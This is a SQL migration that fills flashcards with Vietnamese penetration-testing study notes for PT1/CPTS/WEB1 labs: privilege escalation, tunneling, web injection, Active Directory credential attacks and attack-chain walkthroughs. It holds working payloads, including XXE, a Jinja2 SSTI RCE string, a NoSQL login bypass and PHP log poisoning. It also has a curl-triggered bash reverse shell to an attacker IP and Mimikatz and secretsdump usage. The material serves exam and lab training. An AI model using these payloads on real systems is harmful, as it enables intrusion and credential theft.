* `Ctrl+B` rồi `D` : Tách rời (Detach) phiên làm việc để chạy ngầm an toàn.
* Lệnh ngoài terminal: `tmux a` hoặc `tmux attach` để mở lại phiên làm việc.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 10 — tmux: thao tác window/pane nhanh';

-- ============================================================================
-- LAB 11 — Windows Privilege Escalation
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Windows Privilege Escalation: Token Privileges & Services (PT1 / CPTS)

### 1. Quyền hạn đặc biệt (Privileges) trong Windows
Trên hệ điều hành Windows, các tài khoản dịch vụ (Service Accounts) thường được gán các đặc quyền hệ thống để thực hiện nhiệm vụ của mình.
* Lệnh kiểm tra: `whoami /priv`
* **`SeImpersonatePrivilege` là gì? Tại sao nguy hiểm?**
  * Đây là đặc quyền cho phép một tiến trình được quyền "đóng giả" (impersonate) một token bảo mật của người dùng khác khi họ kết nối đến tiến trình đó.
  * **Công cụ `PrintSpoofer`:** Lợi dụng đặc quyền này bằng cách ép dịch vụ in ấn hệ thống (Print Spooler - vốn luôn chạy dưới quyền `NT AUTHORITY\SYSTEM`) kết nối vào một Named Pipe do kẻ tấn công kiểm soát. Khi Print Spooler kết nối đến, PrintSpoofer sẽ "đánh cắp" token của SYSTEM và spawn ra cửa sổ dòng lệnh chạy với quyền quản trị tối cao của máy Windows!
  * Cú pháp: `PrintSpoofer64.exe -i -c cmd`

### 2. Lỗ hổng Unquoted Service Path là gì?
Xảy ra khi đường dẫn tệp thực thi của một Windows Service có khoảng trắng và không được đặt trong dấu ngoặc kép (Ví dụ: `C:\Program Files\Development App\service.exe`).
Khi khởi động service, Windows sẽ lần lượt thử thực thi các file sau theo thứ tự:
1. `C:\Program.exe`
2. `C:\Program Files\Development.exe`
3. `C:\Program Files\Development App\service.exe`
Nếu thư mục `C:\` hoặc `C:\Program Files\` cho phép tài khoản thường ghi file, ta chỉ việc tạo file độc hại `C:\Program.exe` để Windows tự động chạy mã độc của ta dưới quyền của Service (thường là SYSTEM).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 11 — Windows Privilege Escalation cơ bản';

-- ============================================================================
-- LAB 12 — Chisel Tunneling
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## SOCKS Tunneling với Chisel & Proxychains (PT1 / CPTS)

### 1. Tại sao cần Tunneling (Đường hầm mạng)?
Khi máy mục tiêu thứ hai (Internal Target) nằm trong dải mạng nội bộ mà máy Kali của bạn không thể định tuyến tới trực tiếp, bạn phải biến máy mục tiêu thứ nhất (Pivot Host - máy đã bị chiếm trước đó) thành một trạm trung chuyển lưu lượng.

### 2. Chisel là gì? Hoạt động ra sao?
* Chisel là một công cụ tạo đường hầm TCP/UDP cực kỳ nhanh viết bằng Go, mã hóa toàn bộ dữ liệu qua giao thức HTTP/WebSockets có bảo mật SSH.
* **Cơ chế Reverse SOCKS (`R:socks`):**
  * Thay vì mở proxy trên máy nạn nhân (dễ bị firewall chặn kết nối vào), máy Kali sẽ mở Server trước:
    `chisel server -p 8080 --reverse`
  * Máy nạn nhân (client) kết nối ngược ra ngoài về Kali:
    `chisel client 10.10.14.5:8080 R:socks`
  * Chisel sẽ tạo một cổng proxy SOCKS5 (mặc định port 1080) ngay trên máy Kali của bạn!

### 3. Proxychains là gì?
* Là tiện ích trên Linux cho phép ép bất kỳ công cụ dòng lệnh nào (như Nmap, Curl, SSH) phải đi qua một chuỗi các máy chủ proxy.
* Cấu hình trong `/etc/proxychains4.conf`: thêm dòng `socks5 127.0.0.1 1080` vào cuối file.
* Khi quét Nmap qua Proxychains: `proxychains nmap -sT -p 445 10.10.30.50` (Bắt buộc dùng cờ `-sT` vì proxy không hỗ trợ gửi các gói tin SYN nguyên bản của cờ `-sS`).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 12 — File transfer & pivoting/tunneling';

-- ============================================================================
-- LAB 13 — XSS, SSRF, XXE
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Lỗ hổng Web: XSS, SSRF & XXE (WEB1)

### 1. Cross-Site Scripting (XSS)
* Xảy ra khi ứng dụng web nhận input từ người dùng và hiển thị lại trên trình duyệt mà không qua mã hóa HTML (HTML Entity Encoding).
* Mã JavaScript độc hại sẽ thực thi trực tiếp trong ngữ cảnh phiên duyệt web của nạn nhân, cho phép đánh cắp session cookie (`document.cookie`) hoặc chuyển hướng nạn nhân sang trang lừa đảo.
* Bypass bộ lọc thẻ `<script>`: Dùng các thẻ HTML có gắn sự kiện như `<img src=x onerror=alert(1)>` hoặc `<svg onload=alert(1)>`.

### 2. Server-Side Request Forgery (SSRF)
* Xảy ra khi máy chủ web cho phép người dùng cung cấp một đường dẫn URL, và máy chủ sẽ tự mình gửi HTTP request tới URL đó.
* **Tại sao nguy hiểm?** Máy chủ web thường nằm trong mạng nội bộ và có quyền truy cập vào các tài nguyên mà người dùng bên ngoài không thể chạm tới:
  * Truy cập các dịch vụ nội bộ chạy trên `localhost` (127.0.0.1:8080).
  * Truy cập dịch vụ Metadata của nhà cung cấp điện toán đám mây: Địa chỉ link-local `http://169.254.169.254/` trên AWS/GCP để lấy IAM Access Keys tạm thời của máy chủ.

### 3. XML External Entity (XXE)
* Xảy ra khi trình phân tích cú pháp XML (XML Parser) nạp dữ liệu từ các thực thể bên ngoài (External Entity).
* Payload: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`
* Trình phân tích sẽ tự động đọc nội dung file `/etc/passwd` và thay thế vào vị trí của thực thể `&xxe;` trong tài liệu XML.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 13 — Web: XSS, SSRF, XXE cơ bản';

-- ============================================================================
-- LAB 14 — NFS, SNMP, DNS
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Network Services Enumeration: NFS, SNMP & DNS (PT1 / CPTS)

### 1. NFS (Network File System - Cổng 2049)
* Giao thức chia sẻ tệp tin qua mạng phổ biến trong môi trường Linux/Unix.
* Lệnh kiểm tra danh sách chia sẻ: `showmount -e 10.10.10.5`
* Mount vào máy tấn công: `mount -t nfs 10.10.10.5:/shared /mnt/nfs`
* **Lỗ hổng `no_root_squash`:**
  * Bình thường, nếu bạn là `root` trên máy Kali và tạo một file trên thư mục NFS, server sẽ ép quyền đó thành user vô danh `nobody` (cơ chế `root_squash`).
  * Nếu server cấu hình `no_root_squash`: Quyền `root` của bạn được giữ nguyên! Bạn chỉ việc copy `/bin/bash` vào thư mục mount, gán quyền SUID (`chmod +s bash`), rồi từ máy victim chạy file bash đó để thành root thật sự.

### 2. SNMP (Simple Network Management Protocol - 161/UDP)
* Giao thức giám sát và quản lý thiết bị mạng (router, switch, server).
* Sử dụng `community string` đóng vai trò như mật khẩu dạng văn bản rõ. Hai giá trị mặc định luôn phải thử: `public` (chỉ đọc) và `private` (cho phép cấu hình).
* Lệnh duyệt toàn bộ OID: `snmpwalk -v2c -c public 10.10.10.5`
  * Thu thập được: Danh sách các tiến trình đang chạy, card mạng nội bộ, danh sách người dùng hệ thống.

### 3. DNS Zone Transfer (AXFR - Cổng 53)
* Cơ chế đồng bộ dữ liệu giữa Primary DNS và Secondary DNS Server.
* Nếu không giới hạn IP, bất kỳ ai cũng có thể gửi lệnh `dig axfr @10.10.10.5 domain.local` để lấy toàn bộ danh sách subdomain nội bộ của công ty trong 1 giây.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 14 — Network enum nâng cao: NFS, SNMP, DNS Zone Transfer';

-- ============================================================================
-- LAB 15 — Responder, GPP, Mimikatz
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Active Directory Credential Access: LLMNR, GPP & Mimikatz (CPTS)

### 1. LLMNR / NBT-NS Poisoning với `responder`
* Khi một máy tính Windows gõ sai tên chia sẻ mạng (VD: `\\fileshar`), máy sẽ phát sóng broadcast hỏi toàn mạng nội bộ qua giao thức LLMNR hoặc NetBIOS.
* **Responder hoạt động ra sao?** 
  Responder lắng nghe trên card mạng (`responder -I tun0`). Khi thấy gói tin broadcast hỏi tên, Responder sẽ trả lời giả mạo: "Tôi chính là fileshar đây!". Nạn nhân sẽ tự động gửi gói tin xác thực mạng chứa **NetNTLMv2 hash** sang cho máy của Attacker.
* **Lưu ý tối quan trọng khi thi:** NetNTLMv2 hash là dữ liệu challenge-response **KHÔNG THỂ dùng cho Pass-the-Hash**, bắt buộc phải dùng Hashcat mode `-m 5600` để bẻ khóa offline tìm mật khẩu gốc.

### 2. Lỗ hổng Group Policy Preferences (GPP `cpassword`)
* Trong các phiên bản Windows Server cũ, quản trị viên có thể đặt mật khẩu tài khoản Local Administrator trên hàng loạt máy thông qua Group Policy. Mật khẩu này được lưu trong file `Groups.xml` tại thư mục chia sẻ SYSVOL dưới thuộc tính `cpassword`.
* Dù Microsoft đã mã hóa bằng AES-256, nhưng chính Microsoft lại công khai khóa giải mã tĩnh trên tài liệu MSDN (CVE-2014-1812). Dùng công cụ `gpp-decrypt <cpassword>` để giải mã ra mật khẩu trong 1 tích tắc mà không cần brute-force.

### 3. Trích xuất bộ nhớ với `mimikatz`
* Khi bạn đã có shell Administrator cục bộ trên một máy Windows:
  * `privilege::debug`: Bật đặc quyền SeDebugPrivilege để cho phép Mimikatz đọc trực tiếp bộ nhớ của các tiến trình hệ thống.
  * `sekurlsa::logonpasswords`: Trích xuất toàn bộ NTLM hash và mật khẩu trong bộ nhớ của dịch vụ xác thực Windows LSASS (Local Security Authority Subsystem Service). Nếu trước đó có Domain Admin từng RDP vào máy này, hash của họ sẽ vẫn còn lưu trong RAM!'::text), true)
WHERE kind = 'lab' AND front = 'Lab 15 — AD Credential Attacks: LLMNR/Responder, GPP, Mimikatz';

-- ============================================================================
-- LAB 16 — Web Advanced: CORS, Smuggling, Deserialization
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Web nâng cao: CORS, HTTP Smuggling & Deserialization (WEB1)

### 1. CORS Misconfiguration là gì?
* Chính sách Same-Origin Policy (SOP) của trình duyệt mặc định chặn website này đọc dữ liệu từ website khác.
* CORS (Cross-Origin Resource Sharing) sinh ra để nới lỏng chính sách này một cách có kiểm soát.
* **Lỗ hổng cấu hình sai:** Nếu máy chủ phản chiếu (reflect) bất kỳ giá trị nào từ header `Origin` của client vào header `Access-Control-Allow-Origin`, KÈM THEO header `Access-Control-Allow-Credentials: true`.
* **Khai thác:** Kẻ tấn công tạo một trang web độc hại dụ nạn nhân truy cập; mã JavaScript trên trang đó có thể gửi request có cookie và đọc toàn bộ dữ liệu riêng tư (profile, API token) của nạn nhân.

### 2. HTTP Request Smuggling là gì?
* Xảy ra trong các hệ thống mạng có tầng Front-end (CDN, Reverse Proxy) đứng trước tầng Back-end server.
* Do cách hiểu khác nhau về chuẩn HTTP giữa hai máy chủ khi xử lý đồng thời hai header xác định độ dài: `Content-Length` (CL) và `Transfer-Encoding: chunked` (TE).
* Kẻ tấn công gửi một request chứa cả hai header mâu thuẫn. Phần dữ liệu dư thừa bị Front-end bỏ qua nhưng lại bị Back-end hiểu nhầm là phần mở đầu của request từ **người dùng kế tiếp** trên cùng kết nối mạng, dẫn đến cướp phiên đăng nhập (Session Hijacking).

### 3. Insecure Deserialization
* Serialization là quá trình chuyển đổi một đối tượng dữ liệu trong bộ nhớ (Object) thành một chuỗi byte để lưu trữ hoặc truyền qua mạng. Deserialization là quá trình tái tạo ngược lại từ chuỗi byte thành đối tượng.
* **Lỗ hổng:** Nếu ứng dụng nạp chuỗi byte do người dùng gửi lên mà không kiểm tra tính toàn vẹn.
* **Java:** Chuỗi Base64 luôn bắt đầu bằng magic bytes `rO0AB...` (`0xACED0005`). Dùng công cụ `ysoserial` để tạo gadget chain dẫn đến RCE.
* **PHP:** Chuỗi có dạng `O:<len>:"<class>":...`. Khai thác thông qua các magic method của PHP như `__wakeup()` hay `__destruct()`.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 16 — Web nâng cao: CORS, HTTP Smuggling, Insecure Deserialization';

-- ============================================================================
-- LAB 17 — SSTI, NoSQLi & Searchsploit
-- ============================================================================
UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Web nâng cao 2: SSTI, NoSQL Injection & Searchsploit (WEB1 / PT1)

### 1. Server-Side Template Injection (SSTI) là gì?
Nhiều ứng dụng web sử dụng Template Engine (như Jinja2 trong Python Flask, Twig trong PHP, Freemarker trong Java) để tạo giao diện HTML động.
Lỗ hổng SSTI xảy ra khi ứng dụng nhúng trực tiếp dữ liệu do người dùng nhập vào chuỗi template trước khi render thay vì truyền qua biến ngữ cảnh an toàn.
* **Nhận diện:** Gửi các biểu thức toán học. Nếu server trả về kết quả đã tính toán, ứng dụng dính SSTI:
  * Jinja2 / Twig: `{{7*7}}` -> hiển thị `49`
  * Freemarker / Java EL: `${7*7}` -> hiển thị `49`
* **Khai thác RCE trên Jinja2 (Python):**
  * `{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}`
  * Tận dụng cây đối tượng nội tại của Python để truy cập vào module `os` và thực thi lệnh shell hệ thống.

### 2. NoSQL Injection (MongoDB)
* Khác với SQL truyền thống dùng chuỗi văn bản, cơ sở dữ liệu NoSQL (như MongoDB) sử dụng các đối tượng dữ liệu BSON/JSON.
* **Cơ chế tấn công:** Nếu ứng dụng web truyền thẳng object JSON của client vào hàm truy vấn `db.users.find(query)`:
  * Gửi JSON: `{"username": "admin", "password": {"$ne": null}}`
  * Toán tử `$ne` nghĩa là **Not Equal (Không bằng)**. Biểu thức "mật khẩu không bằng null" luôn luôn đúng với mọi tài khoản có tồn tại mật khẩu, giúp bypass đăng nhập ngay lập tức.
  * Khi gửi qua form URL-encoded: `username=admin&password[$ne]=invalid`

### 3. Tra cứu Exploit với `searchsploit`
* `searchsploit` là công cụ dòng lệnh cho phép tra cứu offline toàn bộ cơ sở dữ liệu Exploit-DB (hàng chục ngàn mã khai thác công khai) ngay trên máy Kali mà không cần kết nối Internet.
* `searchsploit apache 2.4.49`: Tìm kiếm exploit theo tên phần mềm và số phiên bản.
* `searchsploit -x 50383`: Xem trực tiếp nội dung mã nguồn exploit trên terminal (`-x` = examine) để kiểm tra cách dùng trước khi chạy.
* `searchsploit -m 50383`: Sao chép (mirror) file exploit về thư mục hiện tại để chỉnh sửa IP/cổng (`-m` = mirror).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 17 — Web nâng cao 2: SSTI, NoSQLi & Tra cứu Exploit (searchsploit)';

-- ============================================================================
-- ASSIGNMENTS 1 - 8: PHÂN TÍCH CHUỖI TẤN CÔNG (ATTACK CHAINS)
-- ============================================================================

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 1: Phân tích chuỗi từ Recon đến Foothold qua Backdoor FTP (PT1)

### 1. Tư duy tiếp cận mục tiêu Black-box
Khi pentest một dải mạng không có thông tin trước (Black-box), bước đầu tiên luôn là xác định máy chủ mục tiêu đang hoạt động (`nmap -sn`), sau đó quét toàn bộ các cổng TCP (`nmap -p-`).

### 2. Tại sao lại khai thác vsftpd 2.3.4 thay vì các cổng khác?
Kết quả quét Nmap cho thấy có 3 cổng mở:
* Cổng 22 (SSH OpenSSH 5.9p1)
* Cổng 80 (Apache 2.2.22)
* Cổng 21 (vsftpd 2.3.4)
**Quy tắc ưu tiên khai thác:**
* SSH là giao thức an toàn, trừ khi có thông tin rò rỉ credential từ trước, không bao giờ brute-force SSH ngay đầu bài vì rất tốn thời gian và dễ bị khóa tài khoản.
* Dịch vụ FTP phiên bản `vsftpd 2.3.4` có lỗ hổng backdoor nổi tiếng thế giới (CVE-2011-2523). Bản mã nguồn này từng bị chèn mã độc: chỉ cần gửi một username bất kỳ kết thúc bằng ký tự cười `:)`, máy chủ sẽ tự động mở shell root trên cổng 6200 mà **hoàn toàn không cần mật khẩu**!
* Sử dụng Metasploit: `use exploit/unix/ftp/vsftpd_234_backdoor` để có được root shell tức thì.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 1 — External recon đến foothold qua FTP backdoor';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 2: Web Recon → SQLi → Trích xuất Credential (WEB1 / PT1)

### 1. Tầm quan trọng của tệp tin sao lưu (.bak / .old)
Khi lập trình viên triển khai ứng dụng lên production, họ thường tạo các tệp tin backup nhanh (như `config.php.bak`, `backup.zip`). Web server thông thường chỉ thực thi mã khi tệp có đuôi `.php`; khi gặp đuôi `.bak`, web server sẽ trả về toàn bộ mã nguồn dưới dạng văn bản tĩnh!
* Dò tìm bằng `gobuster -x php,bak,zip`.
* Tải về đọc được mật khẩu cơ sở dữ liệu `app_admin / Spring2026!`.

### 2. Nguyên tắc "Tái sử dụng mật khẩu" (Password Reuse)
Trong thực tế và bài thi, con người có xu hướng dùng chung một mật khẩu cho nhiều dịch vụ. Ngay khi tìm được mật khẩu database, phản xạ đầu tiên của Pentester là:
1. Thử đăng nhập vào trang quản trị `/admin`.
2. Thử đăng nhập SSH vào máy chủ với các username đã biết (`admin`, `root`, `app_admin`).
3. Khai thác sâu SQLi qua Sqlmap để dump toàn bộ cơ sở dữ liệu người dùng.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 2 — Web enum đến SQLi dump credentials';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 3: Lỗ hổng Upload tệp → Reverse Shell (WEB1 / PT1)

### 1. Cơ chế kiểm tra tệp tin của máy chủ
Hầu hết các bộ lọc tệp tin tải lên đều mắc phải một trong ba sai lầm:
1. **Chỉ kiểm tra phần mở rộng tệp dạng Blacklist:** Chỉ chặn đuôi `.php` nhưng quên mất máy chủ Apache vẫn thực thi các đuôi `.phtml`, `.php5`, `.phar`.
2. **Chỉ kiểm tra header `Content-Type` do trình duyệt gửi lên:** Dễ dàng bị sửa đổi trong Burp Suite thành `image/jpeg`.
3. **Chỉ kiểm tra vài byte đầu tệp (Magic Bytes):** Có thể vượt qua bằng cách thêm tiền tố `GIF89a;` vào đầu file PHP.

### 2. Thiết lập kết nối Reverse Shell
1. Mở listener trên máy tấn công: `nc -nvlp 4444`
2. Kích hoạt webshell:
   `curl "http://10.10.20.35/uploads/shell.phtml?cmd=bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"`
3. URL-encode ký tự `&` thành `%26` để web server không hiểu nhầm là dấu ngắt tham số HTTP.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 3 — File upload vulnerability đến reverse shell';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 4: Biến LFI thành RCE qua Apache Log Poisoning (WEB1)

### 1. Giới hạn của LFI thuần túy
Lỗ hổng LFI thông thường chỉ cho phép bạn **đọc tệp tin** (như `/etc/passwd` hoặc mã nguồn). Để hoàn thành bài thi hoặc đánh giá an ninh, mục tiêu cao nhất luôn là đạt được quyền **thực thi mã từ xa (RCE)** để lấy shell.

### 2. Kỹ thuật Log Poisoning (Đầu độc nhật ký)
Nếu máy chủ chạy web server Apache và ứng dụng cho phép bạn đọc file log `/var/log/apache2/access.log`:
1. Apache ghi lại chuỗi `User-Agent` của mọi yêu cầu truy cập vào `access.log`.
2. Gửi request với User-Agent chứa mã PHP:
   `curl -A "<?php system(\$_GET[''cmd'']); ?>" http://10.10.20.45/`
3. Lúc này, chuỗi mã PHP đã nằm cố định trong tệp log trên máy chủ nạn nhân.
4. Dùng LFI include chính tệp log đó:
   `http://10.10.20.45/index.php?page=../../../../var/log/apache2/access.log&cmd=id`
   Khi PHP engine nạp tệp log, nó sẽ thực thi đoạn mã độc trong User-Agent và trả về kết quả của lệnh `id`!'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 4 — LFI + log poisoning đến RCE';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 7: Password Spraying đến Evil-WinRM Shell (CPTS)

### 1. Chiến thuật né khóa tài khoản với Password Spraying
* Trong Active Directory, cấu hình *Account Lockout Threshold* thường đặt là 3 hoặc 5 lần nhập sai mật khẩu sẽ khóa tài khoản trong 30 phút.
* Nếu brute-force 1000 mật khẩu vào tài khoản `jsmith`, tài khoản sẽ bị khóa ngay sau 5 giây và bạn sẽ bị phát hiện bởi đội ngũ SOC/Blue Team.
* **Password Spraying:** Lấy danh sách 100 user hợp lệ (từ Kerbrute), sau đó thử **DUY NHẤT 1 mật khẩu theo mùa/công ty** (như `Welcome2026!`, `Summer2026!`, `Company@123`) trên toàn bộ 100 user. Tỷ lệ thành công cực cao mà mỗi user chỉ bị ghi nhận sai 1 lần duy nhất, hoàn toàn không bị khóa tài khoản!

### 2. Lấy shell từ xa với `evil-winrm`
* Khi phát hiện tài khoản có quyền quản trị cục bộ `(Pwn3d!)`, ta dùng `evil-winrm` để kết nối vào cổng 5985/5986 của dịch vụ WinRM.
* Evil-WinRM hỗ trợ tải/tải lên file, nạp trực tiếp script PowerShell vào bộ nhớ (né ghi xuống đĩa) và hỗ trợ cả Pass-the-Hash qua cờ `-H`.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 7 — Password spraying đến shell qua WinRM';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment 8: BloodHound đến Domain Admin qua ACL Abuse (CPTS)

### 1. Lạm dụng quyền điều khiển truy cập (ACL Abuse)
Trong Active Directory, quyền hạn không chỉ được quyết định bởi nhóm (Groups) mà còn bởi danh sách kiểm soát truy cập (Access Control Lists - ACLs) gán trên từng đối tượng.
* **Quyền `GenericAll`:** Cấp quyền toàn quyền trên một đối tượng khác. Nếu user của bạn có `GenericAll` trên một tài khoản dịch vụ (`svc_backup`), bạn có quyền dùng lệnh `net rpc password` để **đổi mật khẩu của svc_backup thành giá trị mới** mà không cần biết mật khẩu cũ.

### 2. Lạm dụng đặc quyền nhóm `Backup Operators`
* Người dùng thuộc nhóm Backup Operators được cấp quyền hệ thống `SeBackupPrivilege`.
* Đặc quyền này cho phép bỏ qua toàn bộ danh sách kiểm tra quyền hạn (DACL) để sao lưu bất kỳ file nào trên hệ thống, bao gồm cả cơ sở dữ liệu Active Directory `C:\Windows\NTDS\ntds.dit`.
* Dùng `secretsdump.py` của bộ công cụ Impacket để dump từ xa toàn bộ hash mật khẩu của toàn bộ nhân viên trong công ty, bao gồm cả Domain Administrator!'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 8 — BloodHound đến Domain Admin';
